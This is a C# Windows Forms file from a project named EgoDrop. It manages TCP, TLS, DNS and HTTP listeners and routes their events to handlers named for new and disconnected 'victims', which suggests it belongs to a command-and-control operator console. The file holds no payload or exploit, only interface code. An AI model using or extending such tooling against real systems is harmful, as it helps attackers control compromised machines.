using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EgoDrop
{
    public partial class frmListener : Form
    {
        private frmMain m_fMain { get; set; }
        public clsSqlite m_sqlite { get; set; }
        public Dictionary<string, clsListener> m_dicListener { get; set; }

        public frmListener(frmMain fMain, clsSqlite sqlite, Dictionary<string, clsListener> dicListener)
        {
            InitializeComponent();

            m_fMain = fMain;
            m_sqlite = sqlite;
            m_dicListener = dicListener;
        }

        private clsListener fnGetListenerFromTag(ListViewItem item) => (clsListener)item.Tag;

        public void fnLoadListener()
        {
            listView1.Items.Clear();

            var lListener = m_sqlite.fnGetListeners();
            foreach (var l in lListener)
            {
                clsListener lis = new clsListener();
                if (m_dicListener.ContainsKey(l.szName))
                {
                    lis = m_dicListener[l.szName];
                }
                else
                {
                    switch (l.protoListener)
                    {
                        case clsSqlite.enListenerProtocol.TCP:
                            lis = new clsTcpListener(l.szName, l.nPort, l.szDescription);
                            break;
                        case clsSqlite.enListenerProtocol.TLS:
                            lis = new clsTlsListener(l.szName, l.nPort, l.szDescription, l.szCertPath, l.szCertPassword);
                            break;
                        case clsSqlite.enListenerProtocol.DNS:
                            lis = new clsUdpListener(l.szName, l.nPort, l.szDescription);
                            break;
                        case clsSqlite.enListenerProtocol.HTTP:
                            lis = new clsHttpListener(l.szName, l.nPort, false, l.szDescription, l.szHttpHost, l.httpMethod, l.szHttpPath, l.szHttpUA);
                            break;
                    }
                }

                ListViewItem item = new ListViewItem(l.szName);
                item.SubItems.Add(l.protoListener.ToString());
                item.SubItems.Add(l.nPort.ToString());
                item.SubItems.Add(lis.m_bIsListening ? "Listening" : "Closed");
                item.SubItems.Add(l.szDescription);

                item.Tag = lis;

                listView1.Items.Add(item);

                if (!m_dicListener.ContainsKey(l.szName))
                    m_dicListener.Add(l.szName, lis);
            }

            toolStripStatusLabel1.Text = $"Listener[{listView1.Items.Count}]";
        }

        private void fnStart()
        {
            foreach (ListViewItem item in listView1.Items)
            {
                clsListener listener = fnGetListenerFromTag(item);
                if (listener.m_bIsListening)
                    continue;

                listener.fnStart();

                listener.evtNewVictim -= m_fMain.fnOnNewVictim;
                listener.evtReceivedMessage -= m_fMain.fnReceivedMessage;
                listener.evtVictimDisconnected -= m_fMain.fnOnVictimDisconnected;
                listener.evtAddChain -= m_fMain.fnOnAddChain;

                listener.evtNewVictim += m_fMain.fnOnNewVictim;
                listener.evtReceivedMessage += m_fMain.fnReceivedMessage;
                listener.evtVictimDisconnected += m_fMain.fnOnVictimDisconnected;
                listener.evtAddChain += m_fMain.fnOnAddChain;

                m_fMain.fnSysLog($"Started listener(Name={listener.m_stListener.szName}, Port={listener.m_stListener.nPort}, Protocol={Enum.GetName(listener.m_stListener.protoListener)})");
            }

            fnLoadListener();
        }

        private void fnStop()
        {
            foreach (ListViewItem item in listView1.Items)
            {
                clsListener listener = fnGetListenerFromTag(item);
                if (!listener.m_bIsListening)
                    continue;

                listener.fnStop();

                listener.evtNewVictim -= m_fMain.fnOnNewVictim;
                listener.evtReceivedMessage -= m_fMain.fnReceivedMessage;
                listener.evtVictimDisconnected -= m_fMain.fnOnVictimDisconnected;
                listener.evtAddChain -= m_fMain.fnOnAddChain;

                m_fMain.fnSysLog($"Stoppped listener: " + listener.m_stListener.szName);
            }

            fnLoadListener();
        }

        private void fnRestart()
        {
            fnStop();
            fnStart();
        }

        private void fnSetup()
        {
            fnLoadListener();
        }

        private void frmListener_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        //Start
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            fnStart();
        }

        //Stop
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            fnStop();
        }
        //Add
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            frmListenerEdit f = new frmListenerEdit(this);

            f.ShowDialog();
        }

        //Refresh
        private void toolStripMenuItem10_Click(object sender, EventArgs e)
        {
            fnLoadListener();
        }
        //Add
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            frmListenerEdit f = new frmListenerEdit(this);

            f.ShowDialog();
        }
        //Edit
        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                if (fnGetListenerFromTag(item).m_bIsListening)
                {
                    MessageBox.Show("Please stop the listener before you edit it.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    continue;
                }

                frmListenerEdit f = new frmListenerEdit(this, fnGetListenerFromTag(item).m_stListener);

                f.ShowDialog();
            }
        }
        //Delete
        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
                m_sqlite.fnDeleteListener(item.Text);

            fnLoadListener();
        }

        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            switch (e.KeyCode)
            {
                case Keys.F5:
                    fnLoadListener();
                    break;
                case Keys.Enter:
                    List<ListViewItem> ls = listView1.SelectedItems.Cast<ListViewItem>().ToList();
                    if (ls.Count == 0)
                        return;

                    frmListenerEdit f = new frmListenerEdit(this, fnGetListenerFromTag(ls.First()).m_stListener);

                    f.ShowDialog();
                    break;
                case Keys.Delete:
                    foreach (ListViewItem item in listView1.SelectedItems)
                        m_sqlite.fnDeleteListener(item.Text);

                    fnLoadListener();
                    break;
            }
        }

        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            fnStart();
        }

        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            fnRestart();
        }

        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            fnStop();
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            List<ListViewItem> ls = listView1.SelectedItems.Cast<ListViewItem>().ToList();
            if (ls.Count == 0)
                return;

            if (fnGetListenerFromTag(ls.First()).m_bIsListening)
            {
                MessageBox.Show("Please stop the listener before you edit it.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            frmListenerEdit f = new frmListenerEdit(this, fnGetListenerFromTag(ls.First()).m_stListener);

            f.ShowDialog();
        }
    }
}
